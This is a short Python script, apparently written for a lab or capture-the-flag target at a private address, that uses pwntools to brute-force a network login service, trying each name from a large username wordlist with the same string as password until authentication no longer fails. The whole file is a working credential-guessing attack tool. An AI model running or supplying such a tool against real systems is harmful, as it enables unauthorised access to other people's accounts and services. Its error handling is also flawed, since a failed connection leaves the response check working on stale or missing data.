 #!/usr/bin/python3
 
 from pwn import *
 import sys, time, pdb, signal
 
 
 def def_handler(sig, frame):
     print("\n\n[!]Exit\n")
     sys.exit(1)
 
 # Ctrl+C 
 signal.signal(signal.SIGINT, def_handler)
 
 if __name__ == '__main__':
 
     host, port = "192.168.0.74", 31337
 
     f = open("/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt", "rb")
 
     p1 = log.progress("Brute Force")
     p1.status("Starting Brute Force")
 
     time.sleep(2)
 
     for username in f.readlines():
         
         username = username.strip()
         password = username
         
         p1.status("Combination %s:%s" % (username.decode(),password.decode()))
 
         try:
 
             s = remote(host ,port, level='error')
 
             s.recvuntil(b"username> ")
             s.sendline(username)
             s.recvuntil(b"password> ")
             s.sendline(password)
 
             response = s.recv()
 
         except:
             time.sleep(2)
 
         if b"authentication failed" not in response:
             p1.success("Has Succesfull This Credentials %s:%s" % (username.decode(), password.decode()))
             sys.exit(0)
